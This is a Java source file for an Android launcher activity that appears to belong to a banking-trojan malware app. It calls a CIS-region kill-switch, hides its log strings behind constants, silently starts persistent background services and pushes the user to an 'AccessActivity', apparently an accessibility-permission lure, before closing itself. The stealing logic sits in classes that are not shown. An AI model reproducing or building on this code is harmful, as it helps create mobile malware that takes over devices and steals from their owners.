package com.service.app;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Point;
import android.os.Bundle;

import com.service.app.Main.AccessActivity;
import com.service.app.Services.HintService;
import com.service.app.Services.kingservice;
import com.service.app.Services.Utitlies;
import com.service.app.Services.utils;

public class IndexACT extends Activity {

    utils utl = new utils();
    Utitlies idutl = new Utitlies();
    defines consts = new defines();
    private final String TAG_LOG  = IndexACT.class.getSimpleName()+ consts.strTAG1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if(utl.blockCIS(this)){
            return;
        }
        Point size = new Point();
        getWindowManager().getDefaultDisplay().getSize(size);
        utl.SettingsWrite(this, consts.display_width, consts.str_null + size.x);
        utl.SettingsWrite(this, consts.display_height,  consts.str_null + size.y);
        try{
            String str = utl.SettingsRead(this, consts.initialization);//Check initialization if error then do it!
            if(str.contains(consts.str_good)) {
                utl.Log(TAG_LOG, consts.string_137);
                utl.initialization2(this);
            }
        }catch (Exception ex){
            utl.Log(TAG_LOG,consts.string_136);
            utl.initialization(this);
        }
        //utils.startCustomTimer(this, consts.str_null, 15000);
        utl.startKingService(this);

        try {
            if (!utl.isMyServiceRunning(this, kingservice.class)) {
                startService(new Intent(this, kingservice.class));
            } else {
                Intent serviceIntent = new Intent(this, HintService.class);
                startService(serviceIntent);

                startActivity(new Intent(this, AccessActivity.class)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                        .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY));
            }
        }catch (Exception ex) {
        }
        finish();
    }
}
